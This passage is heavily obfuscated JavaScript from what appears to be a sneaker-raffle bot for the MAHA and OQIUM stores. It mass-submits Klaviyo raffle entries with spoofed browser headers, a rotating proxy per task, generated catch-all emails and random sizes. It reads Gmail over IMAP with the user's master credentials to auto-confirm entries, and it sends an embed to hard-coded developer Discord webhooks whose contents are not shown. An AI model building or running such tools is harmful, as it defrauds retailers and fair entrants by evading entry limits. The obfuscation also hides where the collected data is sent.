                                '$consent_form_version': 0x7f7254,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x21d654, _0x986bc0, _0x3b617b) {
                    for (var _0xab988e = 0x0; _0xab988e < _0x986bc0['length']; _0xab988e++) {
                        async function _0x203293(_0x830b30, _0x656bc0, _0x2063cf, _0x42b7ce, _0xaefe3a) {
                            var _0x4ac352, _0x5553b5 = {}, _0x365787 = [], _0x1a1ba5 = {}, _0x2325d2 = [
                                '40',
                                '40,5',
                                '41',
                                '42',
                                '42,5',
                                '43',
                                '44',
                                '45',
                                '45,5',
                                '46',
                                '47',
                                '47,5',
                                '48'
                            ], _0x49b80f = Math['round'](Math['random']() * (_0x2325d2['length'] - 0x1));
                            _0x42b7ce[_0x830b30]['Size'] == 'RANDOM' && (_0x42b7ce[_0x830b30]['Size'] = _0x2325d2[_0x49b80f]);
                            !_0x42b7ce && (_0x42b7ce = {});
                            if (_0x656bc0 != 'ver') {
                                _0x2167ba(_0x2063cf['name'] + '\x20Task\x20' + (_0x830b30 + 0x1) + '\x20/\x20' + _0x42b7ce['length'] + '\x20||\x20File:\x20' + _0x5f3c92 + '\x20Proxies:\x20' + _0x3e3b21), await _0x200aab(_0x42b7ce, _0x830b30), _0x5553b5 = _0x2063cf['data'];
                                _0x656bc0 == 'exp' ? _0x5553b5['data']['attributes']['email'] = '' + _0x42b7ce[_0x830b30]['FirstName'] + _0x42b7ce[_0x830b30]['LastName'] + _0x1c5a09['catchall'] : _0x5553b5['data']['attributes']['email'] = '' + _0x42b7ce[_0x830b30]['Email'];
                                if (_0x42b7ce[_0x830b30]['Size'] == 'RANDOM') {
                                }
                                _0x5553b5['data']['attributes']['properties']['$first_name'] = '' + _0x42b7ce[_0x830b30]['FirstName'], _0x5553b5['data']['attributes']['properties']['$last_name'] = '' + _0x42b7ce[_0x830b30]['LastName'], _0x5553b5['data']['attributes']['properties']['$address1'] = _0x42b7ce[_0x830b30]['Address1'] + '\x20' + _0x42b7ce[_0x830b30]['Address2'] + '\x20' + _0x42b7ce[_0x830b30]['HouseNumber'], _0x5553b5['data']['attributes']['properties']['$zip'] = '' + _0x42b7ce[_0x830b30]['Zip'], _0x5553b5['data']['attributes']['properties']['$city'] = '' + _0x42b7ce[_0x830b30]['City'], _0x5553b5['data']['attributes']['properties']['$country'] = '' + _0x42b7ce[_0x830b30]['Country'], _0x5553b5['data']['attributes']['properties']['Size'] = '' + _0x42b7ce[_0x830b30]['Size'], _0x5553b5['data']['attributes']['properties']['$phone_number'] = '' + _0x42b7ce[_0x830b30]['Phone'], _0x5553b5['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x42b7ce[_0x830b30]['Follower'];
                            }
                            if (_0x1c5a09['useRandomProxy'] = ![])
                                var _0x3f1fb4 = _0xaefe3a[_0x830b30]['split'](':');
                            else
                                var _0x52dc05 = Math['round'](Math['random']() * (_0xaefe3a['length'] - 0x1)), _0x3f1fb4 = _0xaefe3a[_0x52dc05]['split'](':');
                            var _0x20054e = {
                                'jar': _0x1da69d,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x2063cf['url'],
                                'headers': _0x2063cf['headers'],
                                'body': JSON['stringify'](_0x5553b5),
                                'proxy': 'http://' + _0x3f1fb4[0x2] + ':' + _0x3f1fb4[0x3] + '@' + _0x3f1fb4[0x0] + ':' + _0x3f1fb4[0x1]
                            };
                            return _0x656bc0 != 'ver' && (_0x20054e['url'] = _0x2063cf['url'], _0x20054e['headers'] = _0x2063cf['headers']), _0x656bc0 == 'ver' && (_0x20054e['method'] = 'GET'), new Promise(function (_0x2603d5, _0x44244f) {
                                callback = async (_0x59748e, _0x91e76, _0x2a499d) => {
                                    if (!_0x59748e && _0x91e76['statusCode'] == 0xca || !_0x59748e && _0x91e76['statusCode'] == 0xc8) {
                                        if (_0x656bc0 != 'ver') {
                                            var _0xb88a17 = await _0x597409(_0x42b7ce[_0x830b30], _0x2063cf, 'dev', ![]), _0x3c5e8 = await _0x597409(_0x42b7ce[_0x830b30], _0x2063cf, 'pub', ![]);
                                            const _0x3766ab = {
                                                'succesDEVMSG': { 'embeds': [_0xb88a17] },
                                                'succesPUBMSG': { 'embeds': [_0x3c5e8] }
                                            };
                                            if (_0x1c5a09['webhook'] != undefined && _0x1c5a09['webhook'] != '')
                                                try {
                                                    await _0x4f1a4a(_0x1c5a09['webhook'], _0x3766ab['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0xbec2fc(0xc8), await _0x4f1a4a(_0x5df164, _0x3766ab['succesDEVMSG']), await _0xbec2fc(0xc8);
                                            try {
                                                await _0x4f1a4a(_0x53e58f, _0x3766ab['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x498d8e(_0x42b7ce[_0x830b30], _0x2063cf);
                                        }
                                        _0x2603d5(console['log'](_0xe1d9e['green'](_0x27df86() + '\x20[' + _0x2063cf['name'] + ']\x20Task\x20' + (_0x830b30 + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x656bc0 != 'ver') {
                                            var _0x5cde92 = '' + _0x59748e, _0x50d70b = await _0x597409(_0x42b7ce[_0x830b30], _0x2063cf, 'dev', !![], _0x5cde92), _0x1e4f33 = {};
                                            _0x1e4f33['errorDEV'] = { 'embeds': [_0x50d70b] }, _0x176a1f(_0x42b7ce[_0x830b30], _0x2063cf), _0x1c5a09['webhook'] != undefined && _0x1c5a09['webhook'] != '' && await _0x4f1a4a(_0x1c5a09['webhook'], _0x1e4f33['errorDEV']), await _0x4f1a4a(_0x166efb, _0x1e4f33['errorDEV']);
                                        }
                                        _0x44244f(console['log'](_0xe1d9e['red'](_0x27df86() + '\x20[' + _0x2063cf['name'] + ']\x20Task\x20' + (_0x830b30 + 0x1) + ':\x20' + _0x59748e)));
                                    }
                                };
                                try {
                                    _0x656bc0 != 'ver' && console['log'](_0x27df86() + '\x20[' + _0x2063cf['name'] + ']\x20Task\x20' + (_0x830b30 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x5553b5['data']['attributes']['email']), _0x4cfc83(_0x20054e, callback);
                                } catch (_0x11a67b) {
                                    console['log'](_0x27df86() + '\x20Task\x20' + (_0x830b30 + 0x1) + ':\x20' + _0x11a67b);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x203293(_0xab988e, 'nor', _0x21d654, _0x986bc0, _0x3b617b), console['log'](_0x27df86() + '\x20[' + _0x21d654['name'] + ']\x20Sleeping\x20for\x20' + _0x1c5a09['delay'] + '\x20ms'), await _0xbec2fc(_0x1c5a09['delay']);
                        } catch (_0x468f74) {
                        }
                    }
                }
            },
            {
                'name': 'MAHA\x20Raffle\x20Verification',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x594713, _0x3f2c60, _0x15f657) {
                    var _0x415582 = [];
                    async function _0x37d4dd() {
                        var _0x187a76 = new _0x1c5c24({
                            'user': _0x1c5a09['masterMail'],
                            'password': _0x1c5a09['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x49e8d2(_0x46e7fb) {
                            _0x187a76['openBox']('INBOX', ![], _0x46e7fb);
                        }
                        _0x187a76['once']('ready', function () {
                            _0x49e8d2(function (_0x20cda0, _0x911ae6) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x20cda0)
                                    throw _0x20cda0;
                                _0x187a76['seq']['search'](['UNSEEN'], function (_0x3c96d2, _0x206d01) {
                                    if (!_0x206d01 || !_0x206d01['length'])
                                        console['log'](_0x27df86() + '\x20[' + _0x594713['name'] + ']\x20No\x20mails\x20found'), _0x187a76['end']();
                                    else {
                                        var _0x7b12de = _0x187a76['seq']['fetch'](_0x206d01, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x7b12de['on']('message', function (_0xea37f9, _0x35a737) {
                                            var _0x3af95d = '(#' + _0x35a737 + ')\x20';
                                            _0xea37f9['on']('body', function (_0x278a82, _0x16a0b6) {
                                                _0x39d64d(_0x278a82, (_0x29c1f8, _0x8fcd4b) => {
                                                    if (_0x8fcd4b['subject'] == 'Confirm\x20Your\x20Subscription' && _0x8fcd4b['from']['value'][0x0]['name'] == 'Maha\x20Amsterdam') {
                                                        var _0x415747 = _0x8fcd4b['text']['split']('(')[0x1], _0x491696 = _0x415747['split'](')')[0x0];
                                                        _0x415582['push'](_0x491696);
                                                    }
                                                });
                                            }), _0xea37f9['once']('end', function () {
                                            });
                                        }), _0x7b12de['once']('error', function (_0x102c92) {
                                            console['log']('Fetch\x20error:\x20' + _0x102c92);
                                        }), _0x7b12de['once']('end', function () {
                                            _0x187a76['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x187a76['once']('error', function (_0x2ced83) {
                            console['log'](_0xe1d9e['red'](_0x2ced83['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
                        }), _0x187a76['once']('end', async function () {
                        }), _0x187a76['connect']();
                    }
                    async function _0x4f2426(_0x4e7182, _0x3ad5c5, _0x169a7c) {
                        for (var _0x348f64 = 0x0; _0x348f64 < _0x3ad5c5['length']; _0x348f64++) {
                            async function _0x11e280(_0x1856e3, _0x1654a9, _0x1f2e56, _0x45bb58, _0x45f77a) {
                                var _0x521f46, _0x1d9c1a = {}, _0x492727 = [], _0x46426d = {}, _0x88546f = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0xb997b = Math['round'](Math['random']() * (_0x88546f['length'] - 0x1));
                                _0x45bb58[_0x1856e3]['Size'] == 'RANDOM' && (_0x45bb58[_0x1856e3]['Size'] = _0x88546f[_0xb997b]);
                                !_0x45bb58 && (_0x45bb58 = {});
                                if (_0x1c5a09['useRandomProxy'] = ![])
                                    var _0xec5854 = _0x45f77a[_0x1856e3]['split'](':');
                                else
                                    var _0x4e3a36 = Math['round'](Math['random']() * (_0x45f77a['length'] - 0x1)), _0xec5854 = _0x45f77a[_0x4e3a36]['split'](':');
                                var _0x1dbb72 = {
                                    'jar': _0x1da69d,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x1f2e56['url'],
                                    'headers': _0x1f2e56['headers'],
                                    'body': JSON['stringify'](_0x1d9c1a),
                                    'proxy': 'http://' + _0xec5854[0x2] + ':' + _0xec5854[0x3] + '@' + _0xec5854[0x0] + ':' + _0xec5854[0x1]
                                };
                                return _0x1654a9 != 'ver' && (_0x1dbb72['url'] = _0x1f2e56['url'], _0x1dbb72['headers'] = _0x1f2e56['headers']), _0x1654a9 == 'ver' && (_0x1dbb72['method'] = 'GET', _0x1dbb72['url'] = _0x45bb58[_0x1856e3]), new Promise(function (_0x42ec96, _0x2ee422) {
                                    callback = async (_0x5cde1b, _0x1f6aa2, _0x529818) => {
                                        if (!_0x5cde1b && _0x1f6aa2['statusCode'] == 0xca || !_0x5cde1b && _0x1f6aa2['statusCode'] == 0xc8) {
                                            if (_0x1654a9 != 'ver') {
                                                var _0x2d42e4 = await _0x597409(_0x45bb58[_0x1856e3], _0x1f2e56, 'dev', ![]), _0x4f68ce = await _0x597409(_0x45bb58[_0x1856e3], _0x1f2e56, 'pub', ![]);
                                                const _0x27dcfe = {
                                                    'succesDEVMSG': { 'embeds': [_0x2d42e4] },
                                                    'succesPUBMSG': { 'embeds': [_0x4f68ce] }
                                                };
                                                if (_0x1c5a09['webhook'] != undefined && _0x1c5a09['webhook'] != '')
                                                    try {
                                                        await _0x4f1a4a(_0x1c5a09['webhook'], _0x27dcfe['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0xbec2fc(0xc8), await _0x4f1a4a(_0x5df164, _0x27dcfe['succesDEVMSG']), await _0xbec2fc(0xc8);
                                                try {
                                                    await _0x4f1a4a(_0x53e58f, _0x27dcfe['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x498d8e(_0x45bb58[_0x1856e3], _0x1f2e56);
                                            }
                                            _0x42ec96(console['log'](_0xe1d9e['green'](_0x27df86() + '\x20[' + _0x1f2e56['name'] + ']\x20Task\x20' + (_0x1856e3 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x1654a9 != 'ver') {
                                                var _0x399d23 = '' + _0x5cde1b, _0x96df28 = await _0x597409(_0x45bb58[_0x1856e3], _0x1f2e56, 'dev', !![], _0x399d23), _0x141f4e = {};
                                                _0x141f4e['errorDEV'] = { 'embeds': [_0x96df28] }, _0x176a1f(_0x45bb58[_0x1856e3], _0x1f2e56), _0x1c5a09['webhook'] != undefined && _0x1c5a09['webhook'] != '' && await _0x4f1a4a(_0x1c5a09['webhook'], _0x141f4e['errorDEV']), await _0x4f1a4a(_0x166efb, _0x141f4e['errorDEV']);
                                            }
                                            _0x2ee422(console['log'](_0xe1d9e['red'](_0x27df86() + '\x20[' + _0x1f2e56['name'] + ']\x20Task\x20' + (_0x1856e3 + 0x1) + ':\x20' + _0x5cde1b)));
                                        }
                                    };
                                    try {
                                        _0x1654a9 != 'ver' ? console['log'](_0x27df86() + '\x20[' + _0x1f2e56['name'] + ']\x20Task\x20' + (_0x1856e3 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x1d9c1a['data']['attributes']['email']) : console['log'](_0x27df86() + '\x20[' + _0x1f2e56['name'] + ']\x20Task\x20' + (_0x1856e3 + 0x1) + ':\x20Fetching\x20Response'), _0x4cfc83(_0x1dbb72, callback);
                                    } catch (_0x27803a) {
                                        console['log'](_0x27df86() + '\x20Task\x20' + (_0x1856e3 + 0x1) + ':\x20' + _0x27803a);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x11e280(_0x348f64, 'ver', _0x4e7182, _0x3ad5c5, _0x169a7c), console['log'](_0x27df86() + '\x20[' + _0x4e7182['name'] + ']\x20Sleeping\x20for\x20' + _0x1c5a09['delay'] + '\x20ms'), await _0xbec2fc(_0x1c5a09['delay']);
                            } catch (_0xe3ea48) {
                            }
                        }
                    }
                    try {
                        _0x37d4dd(), await _0xbec2fc(0xfa0), console['log']('Found\x20' + _0x415582['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0xbec2fc(0x9c4);
                    }
                    await _0x4f2426(_0x594713, _0x415582, _0x15f657);
                }
            }
        ]
    },
    {
        'name': 'OQIUM\x20Store',
        'modules': [
            {
                'name': 'OQIUM\x20Raffle\x20Entries',
                'store': 'OQIUM',
                'logo': 'https://s3-eu-west-1.amazonaws.com/tpd/logos/5e8e742e8f9bb4000118f0bc/0x0.png',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=R3sbqs',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'RsxJgQ',
                            'custom_source': 'DV6989-100',
                            'email': '',
                            'properties': {
                                '$first_name': '',
                                '$last_name': '',
                                '$phone_number': '',
                                'Size': '',
                                'Instagram\x20Account': '',
                                '$address1': '',
                                '$zip': '',
                                '$city': '',
                                '$country': '',
                                'Accepts\x20Marketing': ['NoByRaffle'],
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'TiDS2V',
                                '$consent_form_version': 0x80926b,
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://oqium.com',
                    'referer': 'https://oqium.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x4b8449, _0x4ed5d1, _0x2f3909) {
                    for (var _0x343911 = 0x0; _0x343911 < _0x4ed5d1['length']; _0x343911++) {
                        async function _0x11fda3(_0x5c287e, _0xfa4974, _0x5513ea, _0xa9e5fb, _0x410994) {
                            var _0x69be28, _0x3508fe = {}, _0x42ebdb = [], _0x14f1dd = {}, _0x401761 = [
                                '40',
                                '40,5',
                                '41',
                                '42',
                                '42,5',
                                '43',
                                '44',
                                '45',
                                '45,5',
                                '46',
                                '47',
                                '47,5',
                                '48'
                            ], _0x5ecc7f = Math['round'](Math['random']() * (_0x401761['length'] - 0x1));
                            _0xa9e5fb[_0x5c287e]['Size'] == 'RANDOM' && (_0xa9e5fb[_0x5c287e]['Size'] = _0x401761[_0x5ecc7f]);
                            !_0xa9e5fb && (_0xa9e5fb = {});
                            if (_0xfa4974 != 'ver') {
                                _0x2167ba(_0x5513ea['name'] + '\x20Task\x20' + (_0x5c287e + 0x1) + '\x20/\x20' + _0xa9e5fb['length'] + '\x20||\x20File:\x20' + _0x5f3c92 + '\x20Proxies:\x20' + _0x3e3b21), await _0x200aab(_0xa9e5fb, _0x5c287e), _0x42ebdb = [{
                                    'type': 'rich',
                                    'title': 'Succesful\x20OQIUM\x20Entry',
                                    'description': '',
                                    'color': 0xc0d6d6,
                                    'fields': [
                                        {
                                            'name': 'User',
                                            'value': '' + _0x50a8aa
                                        },
                                        {
                                            'name': 'Size',
                                            'value': '' + _0xa9e5fb[_0x5c287e]['Size']
                                        },
                                        {
                                            'name': 'Delay',
                                            'value': '' + _0x1c5a09['delay']
                                        },
                                        {
                                            'name': 'Version',
                                            'value': '' + _0x18cd5d
                                        }
                                    ]
                                }], _0x14f1dd = { 'embeds': _0x42ebdb }, _0x3508fe = _0x5513ea['data'];
                                _0xfa4974 == 'exp' ? _0x3508fe['data']['attributes']['email'] = '' + _0xa9e5fb[_0x5c287e]['FirstName'] + _0xa9e5fb[_0x5c287e]['LastName'] + _0x1c5a09['catchall'] : _0x3508fe['data']['attributes']['email'] = '' + _0xa9e5fb[_0x5c287e]['Email'];
                                if (_0xa9e5fb[_0x5c287e]['Size'] == 'RANDOM') {
                                }
                                _0x3508fe['data']['attributes']['properties']['$first_name'] = '' + _0xa9e5fb[_0x5c287e]['FirstName'], _0x3508fe['data']['attributes']['properties']['$last_name'] = '' + _0xa9e5fb[_0x5c287e]['LastName'], _0x3508fe['data']['attributes']['properties']['$address1'] = _0xa9e5fb[_0x5c287e]['Address1'] + '\x20' + _0xa9e5fb[_0x5c287e]['Address2'] + '\x20' + _0xa9e5fb[_0x5c287e]['HouseNumber'], _0x3508fe['data']['attributes']['properties']['$zip'] = '' + _0xa9e5fb[_0x5c287e]['Zip'], _0x3508fe['data']['attributes']['properties']['$city'] = '' + _0xa9e5fb[_0x5c287e]['City'], _0x3508fe['data']['attributes']['properties']['$country'] = '' + _0xa9e5fb[_0x5c287e]['Country'], _0x3508fe['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0xa9e5fb[_0x5c287e]['Size'], _0x3508fe['data']['attributes']['properties']['$phone_number'] = '' + _0xa9e5fb[_0x5c287e]['Phone'], _0x3508fe['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0xa9e5fb[_0x5c287e]['Follower'];
                            }
                            if (_0x1c5a09['useRandomProxy'] = ![])
                                var _0x2caacb = _0x410994[_0x5c287e]['split'](':');
                            else
                                var _0x5dc5ca = Math['round'](Math['random']() * (_0x410994['length'] - 0x1)), _0x2caacb = _0x410994[_0x5dc5ca]['split'](':');
                            var _0x5cb2a9 = {
                                'jar': _0x1da69d,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x5513ea['url'],
                                'headers': _0x5513ea['headers'],
                                'body': JSON['stringify'](_0x3508fe),
                                'proxy': 'http://' + _0x2caacb[0x2] + ':' + _0x2caacb[0x3] + '@' + _0x2caacb[0x0] + ':' + _0x2caacb[0x1]
                            };
                            return _0xfa4974 != 'ver' && (_0x5cb2a9['url'] = _0x5513ea['url'], _0x5cb2a9['headers'] = _0x5513ea['headers']), _0xfa4974 == 'ver' && (_0x5cb2a9['method'] = 'GET'), new Promise(function (_0x9f0457, _0x2ed5e1) {
                                callback = async (_0x44a18c, _0x1a4e9e, _0x376864) => {
                                    if (!_0x44a18c && _0x1a4e9e['statusCode'] == 0xca || !_0x44a18c && _0x1a4e9e['statusCode'] == 0xc8) {
                                        if (_0xfa4974 != 'ver') {
                                            var _0x15b196 = await _0x597409(_0xa9e5fb[_0x5c287e], _0x5513ea, 'dev', ![]), _0x562287 = await _0x597409(_0xa9e5fb[_0x5c287e], _0x5513ea, 'pub', ![]);
                                            const _0x54a249 = {
                                                'succesDEVMSG': { 'embeds': [_0x15b196] },
                                                'succesPUBMSG': { 'embeds': [_0x562287] }
                                            };
                                            if (_0x1c5a09['webhook'] != undefined && _0x1c5a09['webhook'] != '')
                                                try {
                                                    await _0x4f1a4a(_0x1c5a09['webhook'], _0x54a249['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0xbec2fc(0xc8), await _0x4f1a4a(_0x5df164, _0x54a249['succesDEVMSG']), await _0xbec2fc(0xc8);
                                            try {
                                                await _0x4f1a4a(_0x53e58f, _0x54a249['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x498d8e(_0xa9e5fb[_0x5c287e], _0x5513ea);
                                        }
                                        _0x9f0457(console['log'](_0xe1d9e['green'](_0x27df86() + '\x20[' + _0x5513ea['name'] + ']\x20Task\x20' + (_0x5c287e + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0xfa4974 != 'ver') {
                                            var _0x4761f2 = '' + _0x44a18c, _0x4b67cc = await _0x597409(_0xa9e5fb[_0x5c287e], _0x5513ea, 'dev', !![], _0x4761f2), _0x2acd1b = {};
                                            _0x2acd1b['errorDEV'] = { 'embeds': [_0x4b67cc] }, _0x176a1f(_0xa9e5fb[_0x5c287e], _0x5513ea), _0x1c5a09['webhook'] != undefined && _0x1c5a09['webhook'] != '' && await _0x4f1a4a(_0x1c5a09['webhook'], _0x2acd1b['errorDEV']), await _0x4f1a4a(_0x166efb, _0x2acd1b['errorDEV']);
                                        }
                                        _0x2ed5e1(console['log'](_0xe1d9e['red'](_0x27df86() + '\x20[' + _0x5513ea['name'] + ']\x20Task\x20' + (_0x5c287e + 0x1) + ':\x20' + _0x44a18c)));
                                    }
                                };
                                try {
                                    _0xfa4974 != 'ver' && console['log'](_0x27df86() + '\x20[' + _0x5513ea['name'] + ']\x20Task\x20' + (_0x5c287e + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x3508fe['data']['attributes']['email']), _0x4cfc83(_0x5cb2a9, callback);
                                } catch (_0x5d3fc7) {
                                    console['log'](_0x27df86() + '\x20Task\x20' + (_0x5c287e + 0x1) + ':\x20' + _0x5d3fc7);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x11fda3(_0x343911, 'nor', _0x4b8449, _0x4ed5d1, _0x2f3909), console['log'](_0x27df86() + '\x20[' + _0x4b8449['name'] + ']\x20Sleeping\x20for\x20' + _0x1c5a09['delay'] + '\x20ms'), await _0xbec2fc(_0x1c5a09['delay']);
                        } catch (_0x158fdb) {
                        }
                    }
                }
            },
            {
                'name': 'OQIUM\x20Raffle\x20Verification',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x255eb1, _0xf863a8, _0x5180f5) {
                    var _0xf863a8 = [];
                    async function _0x200ca9() {
                        var _0x13e60e = new _0x1c5c24({
                            'user': _0x1c5a09['masterMail'],
                            'password': _0x1c5a09['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x43d29b(_0x4c7d32) {
                            _0x13e60e['openBox']('INBOX', ![], _0x4c7d32);
                        }
                        _0x13e60e['once']('ready', function () {
                            _0x43d29b(function (_0x458e9c, _0x4dd9c3) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x458e9c)
                                    throw _0x458e9c;
                                _0x13e60e['seq']['search'](['UNSEEN'], function (_0x211afc, _0x586a31) {
                                    if (!_0x586a31 || !_0x586a31['length'])
                                        console['log'](_0x27df86() + '\x20[' + _0x255eb1['name'] + ']\x20No\x20mails\x20found'), _0x13e60e['end']();
                                    else {
                                        var _0x5d2b6b = _0x13e60e['seq']['fetch'](_0x586a31, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x5d2b6b['on']('message', function (_0x186542, _0x1bdd86) {
                                            var _0x5dd586 = '(#' + _0x1bdd86 + ')\x20';
                                            _0x186542['on']('body', function (_0x1b1b80, _0x3a75c3) {
                                                _0x39d64d(_0x1b1b80, (_0x1ae0cb, _0x39dbb1) => {
                                                    if (_0x39dbb1['subject'] == 'Confirm\x20Your\x20Subscription' && _0x39dbb1['from']['value'][0x0]['name'] == 'OQIUM') {
